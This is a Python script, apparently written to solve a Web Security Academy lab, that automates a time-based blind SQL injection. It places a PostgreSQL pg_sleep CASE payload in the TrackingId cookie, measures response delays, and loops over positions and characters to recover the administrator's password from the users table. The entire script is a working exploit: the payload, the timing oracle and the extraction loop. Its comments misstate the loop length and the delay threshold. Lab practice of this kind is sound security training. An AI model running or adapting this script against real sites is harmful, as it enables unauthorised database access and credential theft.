# Import libs
import requests
import time
import string

url = "https://0a0c006704db943b81dba2d20059003c.web-security-academy.net"
cookie = "TrackingId=Byq1vy9GcK7yKFUC\'+||+(SELECT+CASE+WHEN (username=\'administrator\'+AND+SUBSTRING(password,{pos},1)=\'{char}\')+THEN+pg_sleep(2)+ELSE+pg_sleep(0)+END+FROM+users)--"

password = ''

# function to make request 
def make_request(pos, char):
    
    # build a request with headers
    headers = {
        "Host":"0a0c006704db943b81dba2d20059003c.web-security-academy.net",
        "Cookie": cookie.format(pos=pos, char=char)
    }

    # record start time 
    start_time = time.time()

    # Do the request
    response = requests.get(url, headers=headers)

    # record end time
    end_time = time.time()

    # diff of record time
    # if diff_time > 5: we found char 
    if (end_time - start_time) > 2:
        return True
    else:
        return False

# loop to run each 19 password positions
for pos in range(1, 21):
    
    # abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789
    for char in string.ascii_letters + string.digits:
        if make_request(pos, char):
            # save each char inside a variable (password)
            password += char
            print("current password:", password)
            break
 
# print password - administrator
print("===============================")
print("Final Password: ", password)